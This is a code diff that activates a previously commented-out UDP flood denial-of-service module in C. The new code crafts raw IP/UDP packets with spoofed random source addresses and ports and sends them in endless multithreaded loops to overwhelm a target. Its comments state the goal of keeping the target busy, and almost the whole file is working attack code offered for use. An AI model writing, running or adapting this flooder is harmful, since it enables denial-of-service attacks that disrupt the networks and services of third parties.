@@ -1,284 +1,225 @@
-#include <stdio.h> // printf/fprintf
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <signal.h>
 #include <errno.h>
 #include <pthread.h>
-#include <sys/wait.h>
-#include <sys/time.h>
 #include <signal.h>
+#include <stdarg.h>
 
-#include <netinet/ip.h>  // struct ip
-#include <sys/socket.h>  // socket()
-#include <netinet/in.h>  // struct sockadd
-#include <netinet/udp.h> // struct udp
+#include <unistd.h>
+#include <netinet/ip.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/udp.h>
 #include <arpa/inet.h>
 
 #include "../main.h"
-#include "../debug.h"
 
-#include "udp_flood.h"
+extern void info(const char *fmt, ...);
+extern void warning(const char *fmt, ...);
+extern void error(const char *fmt, ...);
 
-static int SendUDP(const pUDPStruct us, const int debug_level)
+extern char *randip(char **buff);
+extern int randport(void);
+extern unsigned short checksum(unsigned short *ptr, int hlen);
+
+static int _send_udp_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep, const int dp)
 {
 
-    /*
+    // for UDP padding size
+    // make sure the size is very small
+    // same traffic will send more packets that make the target busy
+    int padding_size = 1;
+    if (dp)
+        // dynamic packet size enable
+        // get the random number from [1, 8]
+        // The number of bytes is a multiple of 4
+        // limited: MTU = 1500
+        padding_size = (2 << (1 + randport() % 8));
+
     int socket_fd;
     socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (socket_fd < 0)
     {
-        ErrorMessage("Create socket failed: %s(%d)", strerror(errno), errno);
-        if (errno == 1)
-        {
-            DebugMessage("This program should run as root user");
-        }
-        else if (errno == 24)
-        {
-            DebugMessage("You shoud check max file number use 'ulimit -n' in linux");
-            DebugMessage("And change the max file number use 'ulimit -n <setting number>'");
-            DebugMessage("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
-        }
-        return 1;
+        /*
+        * if errno == 1
+        *   This program should run as root user
+        * if errno == 24
+        *   You shoud check max file number use 'ulimit -n' in linux
+        *   And change the max file number use 'ulimit -n <setting number>'
+        *   Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time
+        */
+        error(strerror(errno));
     }
+
+    int size = sizeof(struct ip) + sizeof(struct udphdr) + padding_size;
+    char *datagram = (char *)malloc(sizeof(char) * size);
+
+    struct ip *iph = (struct ip *)datagram;
+    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct ip));
 
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
-    // dst
-    sin.sin_port = htons((int)us->dst_port);
-    sin.sin_addr.s_addr = inet_addr(us->dst_ip);
+    sin.sin_port = htons(dport);
+    sin.sin_addr.s_addr = inet_addr(daddr);
 
-    char *datagram, *data;
-    int pksize = sizeof(struct ip) + sizeof(struct udphdr) + PADDING_SIZE;
-    datagram = (char *)malloc(pksize);
+    // ip header
+    iph->ip_v = 4;
+    iph->ip_hl = 5;
+    iph->ip_tos = 0;
+    iph->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + padding_size;
+    iph->ip_id = htons(randport());
+    iph->ip_off = 0;
+    iph->ip_ttl = 255;
+    iph->ip_p = IPPROTO_UDP;
+    iph->ip_sum = 0; // a remplir aprés
+    iph->ip_src.s_addr = inet_addr(saddr);
+    iph->ip_dst.s_addr = inet_addr(daddr);
+    iph->ip_sum = checksum((unsigned short *)datagram, sizeof(struct ip));
 
-    struct ip *iph;
-    iph = (struct ip *)datagram;
+    // udp header
+    udph->uh_sport = htons(sport);
+    udph->uh_dport = htons(dport);
+    udph->uh_ulen = htons(sizeof(struct udphdr) + padding_size);
+    udph->uh_sum = 0;
 
-    struct udphdr *udph;
-    udph = (struct udphdr *)(datagram + sizeof(struct ip));
-
-    data = (char *)(datagram + sizeof(struct ip) + sizeof(struct udphdr));
-
-    memset(datagram, 0, pksize);
+    char *data = (char *)(datagram + sizeof(struct ip) + sizeof(struct udphdr));
     // filed the data
-    memcpy((char *)data, "x", PADDING_SIZE);
+    memcpy((char *)data, "love", (padding_size >> 2));
+
+    struct pseudo_header_udp *psh = (struct pseudo_header_udp *)malloc(sizeof(struct pseudo_header_udp));
+    psh->source_address = inet_addr(saddr);
+	psh->dest_address = sin.sin_addr.s_addr;
+	psh->placeholder = 0;
+	psh->protocol = IPPROTO_TCP;
+	psh->udp_length = htons(size);
+    memcpy(&psh->udph, udph, sizeof(struct udphdr));
+    udph->uh_sum = checksum((unsigned short *)psh, sizeof(struct pseudo_header_udp));
+    free(psh);
 
     int one = 1;
     const int *val = &one;
     if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        ErrorMessage("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
-        //exit(0);
-        return 1;
+        error(strerror(errno));
     }
-
-    // entete ip
-    iph->ip_v = 4;
-    iph->ip_hl = 5;
-    iph->ip_tos = 0;
-    iph->ip_len = pksize;
-    iph->ip_ttl = 255;
-    iph->ip_off = 0;
-    iph->ip_id = sizeof(45);
-    iph->ip_p = IPPROTO_UDP;
-    iph->ip_sum = 0; // a remplir aprés
-    iph->ip_src.s_addr = inet_addr(us->src_ip);
-    iph->ip_dst.s_addr = inet_addr(us->dst_ip);
-
-    // entete udp
-    udph->uh_sport = htons(us->src_port);
-    udph->uh_dport = htons(us->dst_port);
-    udph->uh_ulen = htons(sizeof(struct udphdr) + PADDING_SIZE);
-    udph->uh_sum = CalculateSum((unsigned short *)udph, sizeof(struct udphdr) + PADDING_SIZE);
 
     // envoi
-    int i;
-    for (i = 0; i < us->each_ip_repeat; i++)
+    for (int i = 0; i < rep; i++)
     {
-        if (sendto(
-                socket_fd,
-                datagram,
-                pksize,
-                0,
-                (struct sockaddr *)&sin,
-                sizeof(struct sockaddr)) < 0)
+        if (sendto(socket_fd, datagram, size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)
         {
-            ErrorMessage("Attack send failed");
+            error(strerror(errno));
         }
     }
 
-    //libere la memoire
-    free(datagram);
     close(socket_fd);
-    */
+    free(datagram);
     return 0;
 }
 
-static void FreeUDPStrutBuff(pUDPStruct input)
+static void _attack_thread(pUFTP parameters)
 {
-    // free
-    if (input)
+    char *daddr = parameters->daddr;
+    char *saddr = parameters->saddr;
+    int rep = parameters->rep;
+    int dp = parameters->dp;
+    int sport = parameters->sport;
+    int dport = parameters->dport;
+
+    if (parameters->random_saddr)
     {
-        if (input->dst_ip)
+        saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
+        while (1)
         {
-            free(input->dst_ip);
+            if (parameters->ddp)
+                dport = randport();
+            saddr = randip(&saddr);
+            sport = randport();
+            _send_udp_packet(daddr, dport, saddr, sport, rep, dp);
         }
-        free(input);
+    }
+    else
+    {
+        while (1)
+        {
+            if (parameters->ddp)
+                dport = randport();
+            _send_udp_packet(daddr, dport, saddr, sport, rep, dp);
+        }
     }
 }
 
-static int AttackThread(const pParameter input)
+int udp_flood_attack(char *url, int port, ...)
 {
-    // here is udp flood thread
 
-    /*
-    pUDPStruct udp_struct = (pUDPStruct)malloc(sizeof(UDPStruct));
-    pSplitUrlRet split_result;
+    int slist[4] = {'\0'};
     int i;
 
-    if (!SplitUrl(input->address, &split_result))
+    va_list vlist;
+    va_start(vlist, port);
+    for (i = 0; i < 3; i++)
     {
-        ErrorMessage("AttackThread SplitUrl failed");
-        return 1;
+        slist[i] = va_arg(vlist, int);
     }
-    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->protocol);
-    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->host);
-    ShowMessage(DEBUG, input->debug_mode, "split_reult: %d", split_result->port);
-    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->suffix);
-    if (split_result->port == 0)
+    int random_saddr = slist[0];
+    int rep = slist[1];
+    int thread_number = slist[2];
+    char *saddr = va_arg(vlist, char *);
+    int sport = va_arg(vlist, int);
+    int dp = va_arg(vlist, int);
+    int ddp = va_arg(vlist, int);
+    va_end(vlist);
+
+    pUFTP parameters = (pUFTP)malloc(sizeof(UFTP));
+    parameters->daddr = url;
+    parameters->dport = port;
+    parameters->saddr = saddr;
+    parameters->sport = sport;
+    parameters->rep = rep;
+    parameters->random_saddr = random_saddr;
+    parameters->dp = dp;
+    parameters->ddp = ddp;
+
+    pthread_t tid_list[thread_number];
+    pthread_attr_t attr;
+    int ret;
+    // only one process
+    for (i = 0; i < thread_number; i++)
     {
-        if (strlen(split_result->host) == 0)
+        //input->serial_num = (i * input->max_thread) + j;
+        if (pthread_attr_init(&attr))
         {
-            ErrorMessage("AttackThread SplitUrl not right");
+            error(strerror(errno));
+        }
+        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
+        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
+        {
+            error(strerror(errno));
+        }
+        // create thread
+        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
+        if (ret != 0)
+        {
+            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
             return 1;
         }
-        // make the port as default
-        split_result->port = UDP_FLOOD_PORT_DEFAULT;
+        pthread_attr_destroy(&attr);
     }
-    // init the target ip and port
-    udp_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
-    if (!(udp_struct->dst_ip))
+    // pthread_detach(tid);
+    // join them all
+    for (i = 0; i < thread_number; i++)
     {
-        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
-        return 1;
+        pthread_join(tid_list[i], NULL);
     }
-    if (!memset(udp_struct->dst_ip, 0, IP_BUFFER_SIZE))
-    {
-        ErrorMessage("AttackThread memset failed: %s(%d)", strerror(errno), errno);
-        return 1;
-    }
-    if (!strncpy(udp_struct->dst_ip, split_result->host, strlen(split_result->host)))
-    {
-        ErrorMessage("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
-        return 1;
-    }
-    udp_struct->dst_port = split_result->port;
-    FreeSplitUrlBuff(split_result);
-    udp_struct->each_ip_repeat = input->each_ip_repeat;
-
-    ShowMessage(VERBOSE, input->debug_mode, "AttackThread start sending data...");
-    for (;;)
-    {
-        if (input->random_source_ip_address == ENABLE_SIP)
-        {
-            // randome ip and port
-            if (!GetRandomIP(&(udp_struct->src_ip)))
-            {
-                ErrorMessage("AttackThread GetRandomIP failed");
-                return 1;
-            }
-            // this function has no failed
-            GetRandomPort(&(udp_struct->src_port));
-        }
-        else
-        {
-            // use the static ip and port
-            if (!strncpy(udp_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
-            {
-                ErrorMessage("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
-                return 1;
-            }
-            udp_struct->src_port = (int)DEFAULT_PORT;
-        }
-
-        // rport is random source port
-        for (i = 0; i < input->each_ip_repeat; i++)
-        {
-            if (SendUDP(udp_struct, input->debug_mode))
-            {
-                ErrorMessage("AttackThread Attack failed");
-                //return 1;
-            }
-        }
-        FreeRandomIPBuff(udp_struct->src_ip);
-    }
-    FreeUDPStrutBuff(udp_struct);
-    */
     return 0;
 }
 
-int StartUDPFloodAttack(const pParameter input)
-{
-    // run function in thread
-    // this attack type must run as root
-
-    /*
-    pthread_t tid[input->max_thread];
-    pthread_attr_t attr;
-    int j, ret;
-
-    ShowMessage(VERBOSE, input->debug_mode, "Enter StartUDPFloodAttack");
-
-    extern void SignalExit(int signo);
-    signal(SIGINT, SignalExit);
-    // unlimit loop
-    for (;;)
-    {
-        // only one process
-        for (j = 0; j < input->max_thread; j++)
-        {
-            //input->serial_num = (i * input->max_thread) + j;
-            if (pthread_attr_init(&attr))
-            {
-                ErrorMessage("StartUDPFloodAttack pthread_attr_init failed");
-                return 1;
-            }
-            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
-            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
-            {
-                ErrorMessage("StartUDPFloodAttack pthread_attr_setdetachstate failed");
-                return 1;
-            }
-            // create thread
-            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
-            //printf("j is: %d\n", j);
-            ShowMessage(DEBUG, input->debug_mode, "tid: %ld", tid[j]);
-            // here we make a map
-            if (ret != 0)
-            {
-                ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
-                ErrorMessage("Create pthread failed");
-                return 1;
-            }
-            pthread_attr_destroy(&attr);
-        }
-        //pthread_detach(tid);
-        // join them all
-        for (j = 0; j < input->max_thread; j++)
-        {
-            pthread_join(tid[j], NULL);
-        }
-    }
-    */
-    return 0;
-}
-
+/*
 int StartUDPFloodTest(const pParameter input)
 {
     // for test
-    ShowMessage(VERBOSE, input->debug_mode, "Enter StartUDPFloodTest");
     AttackThread(input);
     return 0;
 }
+*/
